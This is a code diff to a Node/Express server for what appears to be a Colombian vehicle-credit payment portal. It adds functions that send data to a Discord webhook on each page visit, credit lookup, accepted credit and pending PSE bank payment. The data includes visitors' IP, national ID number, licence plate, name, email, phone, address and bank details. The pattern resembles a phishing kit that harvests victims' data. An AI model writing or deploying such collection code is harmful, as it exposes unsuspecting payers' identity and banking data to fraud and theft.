@@ -19,9 +19,46 @@ app.use(['/api/consulta', '/api/pagar-helppiupay'], (req, res, next) => {
   next();
 });
 
+// ============= AVISO A DISCORD AL ENTRAR AL PORTAL =============
+async function avisarEntrada(req) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
+  const referrer = req.headers.referer || req.headers.referrer || '-';
+  const ua = req.headers['user-agent'] || '-';
+  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
+  const r = await fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: `🟢 Entrada al portal de pagos\nReferrer: ${referrer}\nIP: ${ip}\nUser-Agent: ${ua}\n${ts}`
+    })
+  });
+  if (!r.ok) throw new Error('Discord respondió ' + r.status);
+}
+
 // Solo se publican las dos páginas; nada más de la carpeta del proyecto.
-app.get(['/', '/index.html'], (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-app.get('/index2.html', (_req, res) => res.sendFile(path.join(__dirname, 'index2.html')));
+app.get(['/', '/index.html'], (req, res) => {
+  avisarEntrada(req).catch(e => console.error('[DISCORD ENTRADA]', e.message));
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+app.get('/index2.html', (req, res) => {
+  avisarEntrada(req).catch(e => console.error('[DISCORD ENTRADA]', e.message));
+  res.sendFile(path.join(__dirname, 'index2.html'));
+});
+
+async function avisarBusqueda(req, cedula, placa) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
+  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
+  const r = await fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: `🔎 Búsqueda de crédito\nNúmero de documento: ${cedula}\nNumero de Placa: ${placa}\nIP: ${ip}\n${ts}`
+    })
+  });
+  if (!r.ok) throw new Error('Discord respondió ' + r.status);
+}
 
 app.post('/api/consulta', async (req, res) => {
   const cedula = String(req.body?.cedula ?? '').replace(/[\s.]/g, '');
@@ -30,6 +67,7 @@ app.post('/api/consulta', async (req, res) => {
   if (!/^[A-Z0-9]{5,12}$/.test(placa)) return res.status(400).json({ ok: false, code: 'DATOS', error: 'Ingresa una placa válida (sin espacios).' });
   if (activas >= MAX_SIMULTANEAS) return res.status(429).json({ ok: false, code: 'OCUPADO', error: 'Hay muchas consultas en curso. Intenta de nuevo en unos segundos.' });
 
+  avisarBusqueda(req, cedula, placa).catch(e => console.error('[DISCORD BUSQUEDA]', e.message));
   activas++;
   try {
     const r = await consultar({ cedula, placa });
@@ -50,11 +88,28 @@ const HELPPIU_KEY_ID = process.env.HELPPIU_KEY_ID;
 const HELPPIU_SECRET = process.env.HELPPIU_SECRET;
 const HELPPIU_API_URL = process.env.HELPPIU_API_URL || 'https://helppiupay.com/api/v1/checkout-sessions';
 
+async function avisarCreditoAceptado(req, cedula, placa, valor) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-').split(',')[0].trim();
+  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
+  const montoTxt = valor ? '$' + Number(String(valor).replace(/[^\d]/g, '')).toLocaleString('es-CO') + ' COP' : '-';
+  const r = await fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: `🔎 Crédito aceptado\nNúmero de documento: ${cedula || '-'}\nNumero de Placa: ${placa || '-'}\nMonto a pagar: ${montoTxt}\nIP: ${ip}\n${ts}`
+    })
+  });
+  if (!r.ok) throw new Error('Discord respondió ' + r.status);
+}
+
 app.post('/api/pagar-helppiupay', async (req, res) => {
   try {
-    const { credito, valor, nombre, apellido, email } = req.body || {};
+    const { credito, valor, nombre, apellido, email, placa, identificacion } = req.body || {};
     if (!credito || !valor) return res.status(400).json({ error: 'Faltan credito o valor' });
     if (!HELPPIU_KEY_ID || !HELPPIU_SECRET) return res.status(500).json({ error: 'Faltan llaves de HelppiuPay en el servidor' });
+
+    avisarCreditoAceptado(req, identificacion, placa, valor).catch(e => console.error('[DISCORD CREDITO]', e.message));
 
     const amount = parseInt(String(valor).replace(/[^\d]/g, ''), 10);
     if (isNaN(amount) || amount <= 0) return res.status(400).json({ error: 'El valor no es válido: ' + valor });
@@ -108,12 +163,21 @@ app.post('/api/pagar-helppiupay', async (req, res) => {
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const HELPPIU_WEBHOOK_TOKEN = process.env.HELPPIU_WEBHOOK_TOKEN;
 const ESTADOS_EXITOSOS = ['paid', 'approved', 'succeeded', 'success', 'successful', 'completed', 'complete', 'aprobado', 'aprobada', 'pagado', 'exitoso'];
+const TIPOS_DOC = { CC: 'Cédula de ciudadanía', CE: 'Cédula de extranjería', NIT: 'NIT', PP: 'Pasaporte', TI: 'Tarjeta de identidad' };
+const TIPOS_PERSONA = { '0': 'Natural', '1': 'Jurídica', 'N': 'Natural', 'J': 'Jurídica' };
 
 function esPagoExitoso(b) {
   const d = (b && (b.data?.object || b.data)) || {};
   const candidatos = [b?.status, b?.payment_status, b?.state, d.status, d.payment_status, d.state, b?.type, b?.event, b?.event_type]
     .filter((v) => typeof v === 'string').map((v) => v.toLowerCase());
   return candidatos.some((v) => ESTADOS_EXITOSOS.some((e) => v === e || v.endsWith('.' + e) || v.endsWith('_' + e)));
+}
+
+function esPSEPendiente(b) {
+  const event = (b?.event || '').toLowerCase();
+  const d = (b && (b.data?.object || b.data)) || {};
+  const status = (d.status || b?.status || '').toLowerCase();
+  return event === 'transaction.pending' || (status === 'pending' && !esPagoExitoso(b));
 }
 
 async function avisarDiscord(b) {
@@ -144,16 +208,89 @@ async function avisarDiscord(b) {
   if (!r.ok) throw new Error('Discord respondió ' + r.status);
 }
 
+async function avisarFormularioPSE(b) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  const d = (b && (b.data?.object || b.data)) || {};
+  const pick = (...v) => v.find((x) => x !== undefined && x !== null && x !== '');
+
+  const referencia = pick(d.reference, b.reference, d.id, b.id, '-');
+  const nombreCompleto = pick(d.customer_name, b.customer_name, d.customer?.name, b.customer?.name, d.name, b.name, '-');
+  const partes = nombreCompleto !== '-' ? nombreCompleto.split(' ') : [];
+  const nombre = partes[0] || '-';
+  const apellido = partes.slice(1).join(' ') || '-';
+  const correo = pick(d.customer_email, b.customer_email, d.customer?.email, b.customer?.email, d.email, b.email, '-');
+  const monto = pick(d.amount, b.amount, d.amount_total, b.amount_total);
+  const montoTxt = monto !== undefined
+    ? '$ ' + Number(monto).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+    : '-';
+
+  const docTypeCode = pick(d.document_type, b.document_type, d.doc_type, b.doc_type, d.customer?.document_type, '-');
+  const tipoDoc = TIPOS_DOC[docTypeCode] || docTypeCode;
+  const numDoc = pick(d.document_number, b.document_number, d.document, b.document, d.doc_number, b.doc_number, d.customer?.document, '-');
+
+  const personTypeCode = String(pick(d.person_type, b.person_type, d.customer?.person_type, '-'));
+  const tipoPersona = TIPOS_PERSONA[personTypeCode] || personTypeCode;
+
+  const flujoPSE = pick(d.pse_flow, b.pse_flow, d.flow, b.flow, d.pse_reference, b.pse_reference, '-');
+  const bancoClave = pick(d.bank_code, b.bank_code, d.bank_key, b.bank_key, d.bank?.code, '-');
+  const bancoNombre = pick(d.bank_name, b.bank_name, d.bank?.name, b.bank, '-');
+  const bancoRedirect = pick(d.bank_redirect, b.bank_redirect, d.redirect_bank, b.redirect_bank, bancoNombre);
+
+  const telefono = pick(d.phone, b.phone, d.customer_phone, b.customer_phone, d.customer?.phone, b.customer?.phone, d.telephone, '-');
+  const direccion = pick(d.address, b.address, d.customer_address, b.customer_address, d.customer?.address, '-');
+
+  const refStr = String(referencia);
+  const creditoMatch = refStr.replace(/^GM-/, '').match(/^(.+)-\d+$/);
+  const creditoSession = creditoMatch ? creditoMatch[1] : pick(d.checkout_session_id, b.checkout_session_id, '-');
+
+  const ip = pick(d.ip, b.ip, d.client_ip, b.client_ip, d.customer_ip, b.customer_ip, '-');
+  const ua = pick(d.user_agent, b.user_agent, d.browser, b.browser, '-');
+  const ts = new Date().toLocaleString('sv-SE', { timeZone: 'America/Bogota', hour12: false }).replace('T', ' ');
+
+  const r = await fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: [
+        '🏦 Envío formulario PSE',
+        `Referencia: ${referencia}`,
+        `Nombre: ${nombre}`,
+        `Apellido: ${apellido}`,
+        `Correo: ${correo}`,
+        `Valor: ${montoTxt}`,
+        `Tipo de documento: ${tipoDoc}`,
+        `Número de documento: ${numDoc}`,
+        `Tipo de persona: ${tipoPersona}`,
+        `Flujo PSE: ${flujoPSE}`,
+        `Banco clave: ${bancoClave}`,
+        `Banco: ${bancoNombre}`,
+        `Banco redirect: ${bancoRedirect}`,
+        `Teléfono: ${telefono}`,
+        `Dirección: ${direccion}`,
+        `Crédito (sesión): ${creditoSession}`,
+        `IP: ${ip}`,
+        `User-Agent: ${ua}`,
+        ts,
+      ].join('\n')
+    })
+  });
+  if (!r.ok) throw new Error('Discord respondió ' + r.status);
+}
+
 app.post('/api/helppiupay-webhook', async (req, res) => {
   if (HELPPIU_WEBHOOK_TOKEN && req.query.token !== HELPPIU_WEBHOOK_TOKEN) return res.sendStatus(401);
   res.sendStatus(200); // se responde ya para que HelppiuPay no reintente
   try {
     const b = req.body || {};
     console.log('[WEBHOOK HELPPIU] recibido:', JSON.stringify(b).substring(0, 1000));
-    if (!esPagoExitoso(b)) return;
     if (!DISCORD_WEBHOOK_URL) return console.error('[DISCORD] Falta DISCORD_WEBHOOK_URL en el servidor');
-    await avisarDiscord(b);
-    console.log('[DISCORD] Aviso de pago exitoso enviado');
+    if (esPagoExitoso(b)) {
+      await avisarDiscord(b);
+      console.log('[DISCORD] Aviso de pago exitoso enviado');
+    } else if (esPSEPendiente(b)) {
+      await avisarFormularioPSE(b);
+      console.log('[DISCORD] Aviso formulario PSE enviado');
+    }
   } catch (e) {
     console.error('[DISCORD ERROR]', e.message);
   }
